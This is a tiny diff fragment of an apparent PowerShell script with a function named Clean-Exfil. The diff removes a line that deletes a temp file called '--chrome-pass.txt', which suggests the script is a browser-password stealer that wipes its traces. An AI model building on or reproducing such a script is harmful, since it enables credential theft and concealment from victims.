@@ -213,6 +213,3 @@ function Clean-Exfil {
 if (-not ([string]::IsNullOrEmpty($ce))) {
 	Clean-Exfil
 }
-
-
-RI $env:TEMP/--chrome-pass.txt
